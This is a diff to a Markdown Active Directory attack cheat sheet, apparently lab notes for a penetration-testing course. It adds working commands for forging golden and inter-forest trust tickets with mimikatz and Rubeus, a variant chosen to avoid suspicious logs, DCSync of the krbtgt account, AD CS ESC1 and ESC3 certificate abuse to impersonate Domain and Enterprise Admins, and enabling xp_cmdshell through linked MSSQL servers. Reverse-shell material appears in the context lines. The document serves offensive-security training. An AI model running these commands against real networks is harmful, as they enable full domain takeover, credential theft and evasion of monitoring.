@@ -7,6 +7,7 @@
   * [Disable AV monitoring](#disable-av-monitoring)
   * [Enumerate Language mode and Applocker](#enumerate-languagemode-and-applocker)
   * [Reverse Shell](#reverse-shells)
+  * [Convert Certificates](#convert-certificates)
 * [Enumeration](#enumeration)
   * [Enumeration using AD Module](#domain-enumeration-using-activedirectory-module)
   * [Enumeration using PowerView](#domain-enumeration-using-powerview)
@@ -23,6 +24,9 @@
   * [Privilege Escalation - Child to Parent](#privilege-escalation-child-to-parent)
   * [Child to Parent - Trust Tickets](#privilege-escaltion-using-trust-tickets)
   * [Child to Parent - Krbtgt Hash](#privilege-escalation-using-krbtgt-hash)
+  * [Across Forest - Trust Ticket](#privilege-escalation-across-forest-using-trust-ticket)
+  * [Across Forest - AD CS](#privilege-escalation-across-forest-adcs)
+  * [MSSQL](#privilege-escalation-using-mssql)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
   * [Kerberos Delegation](#kerberos-delegation)
@@ -120,6 +124,13 @@ nc64.exe -lvp 443
 ```
 
 **Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
+
+### Convert Certificates
+with the command below it is possible to convert a .pem certificate in a .pfx one:
+```
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\AdministratorCerificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+```
+
 <div style="page-break-after: always;"></div>
 
 ## Enumeration
@@ -774,6 +785,164 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<cur
 ```
 
 In the above command, the mimikatz option "/sids" is forcefully setting the sIDHistory for the enterprise admin group for a domain that is the Forest Enterprise Admin Group
+
+We can avoid suspicious logs by using Domain Controllers group
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid_of_current_domain> /sids:<sid_of_domain_controller_group,sid_of_enterprise_domain_controllers> /krbtgt:<krbtgt_hash> /ptt" "exit"
+```
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync" /user:<parent_domain>\krbtgt /domian:<parent_domain>" "exit"
+```
+
+### Privilege Escalation Across Forest using Trust Tickets
+Once again we require the trust key for the inter-forest trust
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+```
+
+An inter-forest TGT can be forged:
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<domain_sid> /rc4:<hash_trust_key> /service:krbtgt /target:<forest_domain> /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
+```
+
+We can perform the same actions using Rubeus
+```
+C:\AD\Tools\Rubeus.exe silver /service:krbtgt/<current_domain> /rc4:<hash_trust_key> /sid:<current_domain_sid> /sids:<entreprise_admin_group_sid> /ldap /user:Administrator /nowrap
+```
+
+Use the forged ticket:
+```
+C:\AD\Tools\Rubeus.exe asktgs /service:http/<dc_parent_domain> /dc:<parent_domain_domain_controller.parent_domain> /ptt /ticket:<forged_ticket>
+```
+
+### Privilege Escalation Across Forest using ADCS
+Active Directory Certificate Services (AD CS) enables use of public key infrastructure (PKI) in active directory forest.
+ADCS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
+ADCS is the Server Role that allows you to build a public key cryptography, digital certificates and digital signature capabilities for your organization.
+
+There are various ways of abusing ADCS:
+- Extract user and machine certificates
+- User certificates to retrieve NTLM hash
+- User and machine level persistence
+- Escalation to Domain Admin and Enterprise Admin
+- Domain persistence
+
+We can use the Certify tool to enumerate ADCS for the target forest
+```
+Certify.exe cas
+```
+
+Enumerate the templates:
+```
+Certify.exe find
+```
+
+Enumerate vulnerable templates:
+```
+Certify.exe find /vulnerable
+```
+
+We are going to abuse the following vulnerabilites for escalation:
+- ESC1 Enrolee can request cert for ANY user
+- ESC3 Request an enrollment agent certificate and use it to request certo on behalf of ANY user
+
+Common requirements/misconfigurations in ADCS for all the escalation we have:
+- CA grants normal/low-privileged users enrollment
+- Manager approval is disabled
+- Authorization signatures are not required
+- The target template grants normal/low-privileged users enrollment rights
+
+**ESC3**
+
+Escalation to Domain Admin, we can now request a certificate for Certificate Request Agent using a vulnerable template
+```
+Certify.exe request /ca:<domain_controller.domain>\<domain>-MCORP-DC-CA /template:<vulnerable_template>
+```
+
+Convert from cert.pem to pfx and use it to request a certificate on behalf of DA
+```
+Certify.exe request /ca:<domain_controller.domain>\<domain>-MCORP-DC-CA /template:<vulnerable_template> /onbehalfof:<domain>\<username> /enrollmentcert:<certificate> /enrollcertpw:SecretPass@123
+```
+
+We can then use rubeus to convert from cert.pem to pfx and request DA TGT and inject it
+```
+Rubeus.exe asktgt /user:Administrator /cerificate:<certificate>.pfx /password:SecretPassword@123 /ptt
+```
+
+Then we can escalate to Enterprise Admin.
+
+Convert from cert.pem to pfx and use it to request a certificate on behalf of EA using a vulnerable template:
+```
+Certify.exe request /ca:<parent_domain_dc.domain>\moneycorp-MCORP-DC-CA /template:<vulnerable_template> /onbehalfof:<domain>\<user> /enrollcert:<certificate> /enrollcertpw:SecretPass@123
+```
+
+Then we can request Enterprise Admin TGT and inject it
+```
+Rubeus.exe asktgt /user:<domain>\<user> /certificate:<certificate> /dc:<domain_controller.domain> /password:SecretPass@123 /ptt
+```
+
+**ESC1**
+
+A vulnerable template has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag. We can find it using the following command
+```
+Certify.exe find /enrolleeSuppliesSubject
+```
+
+The vulnerable template allows enrollment to the RDPUser group. Request a certificate for DA or EA as normal user
+```
+Certify.exe request /ca:<domain_controller.domain>\moneycorp-MCORP-DCCA /template:"<vulnerable_template" /altname:administrator
+```
+
+Convert the certificate from .pem to .pfx and use it to request a TGT for DA
+```
+Rubeus.exe asktgt /user:administrator /certificate:<certificate>.pfx /password:SecretPass@123 /ptt
+```
+
+### Privilege Escalation Using MSSQL
+MS SQL servers are generally deployed in plenty in a Windows domain. SQL servers provide very good options for lateral movement as domain users can be mapped to database roles. 
+
+For MSSQL and PowerShell hackery we can use PowerUpSQL.
+
+Discover performing SPN scanning
+```
+Get-SQLInstanceDomain
+```
+
+Check Accessibility
+```
+Get-SQLConnectionTestThreaded
+```
+```
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+
+Gather Information
+```
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+
+A Database link allows a SQL server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL server, that is, linked SQL servers it is possible to execute stored procedures. 
+The strenght of database links is that they work even across forest trusts.
+
+Searching Database links
+```
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+```
+
+Enumerating Databese Links
+```
+Get-SQLServerLinkCrawl -Instance <MSSQL_server> -Verbose
+```
+
+It is possible to execute commands on a target server, either xp_cmdshell should be already enabled or if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
+```
+EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "<server_sql>"
+```
+
+In order to execute commands run
+```
+Get-SQLServerLinkCrawl -Instance <server_mssql> -Query "exec master..xp_cmdshell '<command>'" -QueryTarget <server_mssql>
+```
 
 <div style="page-break-after: always;"></div>
 
